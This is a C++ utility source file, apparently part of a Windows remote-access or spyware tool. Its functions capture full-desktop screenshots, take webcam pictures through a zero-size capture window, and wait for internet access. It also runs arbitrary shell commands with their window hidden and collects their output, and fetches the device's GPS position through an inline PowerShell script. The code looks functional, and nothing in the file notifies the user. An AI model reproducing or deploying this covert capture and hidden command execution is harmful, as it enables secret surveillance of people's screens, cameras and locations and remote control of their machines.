#include "utils.h"
#include <string>
#include <atlstr.h>
#include <gdiplus.h>
#include <windows.h>
#include <fstream>
#include "vfw.h"
#include "Config.h"
#include <chrono>
#include <wininet.h>
#include <iostream>

#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "cpprest141_2_10.lib")
#pragma comment (lib,"Gdiplus.lib")
#pragma comment(lib, "Vfw32.lib")

using namespace Gdiplus;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT  num = 0;          // number of image encoders
	UINT  size = 0;         // size of the image encoder array in bytes

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;  // Failure

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;  // Failure

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}
	}

	free(pImageCodecInfo);
	return -1;  // Failure
}

std::string readFileContent(std::string fName) {
	// Converts the file to PNG then read it's content
	// Camera results in BMP file always so we could convert the file directly without checking
	// Unless this changes in the future
	
	// Initialize GDI+.
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	CLSID encoderClsid;
	Gdiplus::Status  stat;
	Gdiplus::Image* image = new Gdiplus::Image((std::wstring(fName.begin(), fName.end()) + L".bmp").c_str());

	// Get the CLSID of the PNG encoder.
	GetEncoderClsid(L"image/png", &encoderClsid);

	stat = image->Save((std::wstring(fName.begin(), fName.end()) + L".png").c_str(), &encoderClsid, NULL);
	delete image; // Free to be able to delete

	std::ifstream file(fName + ".png", std::ios::in | std::ios::binary);
	std::string str = std::string((std::istreambuf_iterator<char>(file)),
		(std::istreambuf_iterator<char>()));
	file.close();
	return str;
}

void takeScreenshot(std::string path) {

	BITMAPFILEHEADER bfHeader;
	BITMAPINFOHEADER biHeader;
	BITMAPINFO bInfo;
	HGDIOBJ hTempBitmap;
	HBITMAP hBitmap;
	BITMAP bAllDesktops;
	HDC hDC, hMemDC;
	LONG lWidth, lHeight;
	BYTE* bBits = NULL;
	HANDLE hHeap = GetProcessHeap();
	DWORD cbBits, dwWritten = 0;
	HANDLE hFile;
	INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
	INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

	ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
	ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
	ZeroMemory(&bInfo, sizeof(BITMAPINFO));
	ZeroMemory(&bAllDesktops, sizeof(BITMAP));

	hDC = GetDC(NULL);
	hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
	GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

	lWidth = bAllDesktops.bmWidth;
	lHeight = bAllDesktops.bmHeight;

	DeleteObject(hTempBitmap);

	bfHeader.bfType = (WORD)('B' | ('M' << 8));
	bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	biHeader.biSize = sizeof(BITMAPINFOHEADER);
	biHeader.biBitCount = 24;
	biHeader.biCompression = BI_RGB;
	biHeader.biPlanes = 1;
	biHeader.biWidth = lWidth;
	biHeader.biHeight = lHeight;

	bInfo.bmiHeader = biHeader;

	cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

	hMemDC = CreateCompatibleDC(hDC);
	hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
	SelectObject(hMemDC, hBitmap);
	BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);


	hFile = CreateFileW(std::wstring(path.begin(), path.end()).c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
	WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
	WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);

	CloseHandle(hFile);

	DeleteDC(hMemDC);
	ReleaseDC(NULL, hDC);
	DeleteObject(hBitmap);
}

bool takeCamPicture(std::string file) {
	// create the preview window 
	HWND hCam = capCreateCaptureWindow(
		L"CAPTURE",
		WS_CHILD,
		0, 0, 0, 0,
		::GetDesktopWindow(), 0);

	if (capDriverConnect(hCam, 0))
	{
		capFileSaveDIB(hCam, std::wstring(file.begin(), file.end()).c_str());
		DestroyWindow(hCam);
		return true;
	}
	DestroyWindow(hCam);
	return false;
}

std::string getTimestamp() {
	const auto p1 = std::chrono::system_clock::now();

	return std::to_string( std::chrono::duration_cast<std::chrono::seconds>(
			p1.time_since_epoch()).count());
}

bool isConnected() {
	return InternetCheckConnection(L"http://google.com", FLAG_ICC_FORCE_CONNECTION, 0);
}

void waitForNetAccess() {
	while (!isConnected()) {
		Sleep(1000);
	}
}

std::string runCmd(const char * cmd) {
	std::string outOutput;

	HANDLE g_hChildStd_OUT_Rd = NULL;
	HANDLE g_hChildStd_OUT_Wr = NULL;
	HANDLE g_hChildStd_ERR_Rd = NULL;
	HANDLE g_hChildStd_ERR_Wr = NULL;

	SECURITY_ATTRIBUTES sa;
	// Set the bInheritHandle flag so pipe handles are inherited.
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	if (!CreatePipe(&g_hChildStd_ERR_Rd, &g_hChildStd_ERR_Wr, &sa, 0)) { return ""; } // Create a pipe for the child process's STDERR.
	if (!SetHandleInformation(g_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0)) { return ""; } // Ensure the read handle to the pipe for STDERR is not inherited.
	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0)) { return ""; } // Create a pipe for the child process's STDOUT.
	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) { return ""; } // Ensure the read handle to the pipe for STDOUT is not inherited

	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	bool bSuccess = FALSE;

	// Set up members of the PROCESS_INFORMATION structure.
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure.
	// This structure specifies the STDERR and STDOUT handles for redirection.
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_ERR_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	int size = MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
	wchar_t* wString = new wchar_t[size];
	MultiByteToWideChar(CP_ACP, 0, cmd, -1, wString, 4096);

	// Create the child process.
	bSuccess = CreateProcess(
		NULL,             // program name
		wString,       // command line
		NULL,             // process security attributes
		NULL,             // primary thread security attributes
		TRUE,             // handles are inherited
		CREATE_NO_WINDOW, // creation flags (this is what hides the window)
		NULL,             // use parent's environment
		NULL,             // use parent's current directory
		&siStartInfo,     // STARTUPINFO pointer
		&piProcInfo       // receives PROCESS_INFORMATION
	);

	CloseHandle(g_hChildStd_ERR_Wr);
	CloseHandle(g_hChildStd_OUT_Wr);

	// read output
#define BUFSIZE 102
	DWORD dwRead;
	CHAR chBuf[BUFSIZE];
	bool bSuccess2 = FALSE;
	for (;;) { // read stdout
		bSuccess2 = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
		if (!bSuccess2 || dwRead == 0) break;
		std::string s(chBuf, dwRead);
		outOutput += s;
	}
	dwRead = 0;
	for (;;) { // read stderr
		bSuccess2 = ReadFile(g_hChildStd_ERR_Rd, chBuf, BUFSIZE, &dwRead, NULL);
		if (!bSuccess2 || dwRead == 0) break;
		std::string s(chBuf, dwRead);
		outOutput += s;
	}

	// The remaining open handles are cleaned up when this process terminates.
	// To avoid resource leaks in a larger application,
	// close handles explicitly.
	return outOutput;
}

std::string getGPSLoc() {
	return runCmd("powershell -c \"add-type -assemblyname system.device;$loc = new-object system.device.location.geocoordinatewatcher;$loc.start();while(($loc.status -ne 'Ready') -and ($loc.permission -ne 'Denied')){start-sleep -milliseconds 100};$acc = 2;while($loc.position.location.horizontalaccuracy -gt $acc){start-sleep -milliseconds 200; $acc = [math]::Round($acc*1.5)};$loc.position;$loc.stop();\"");
}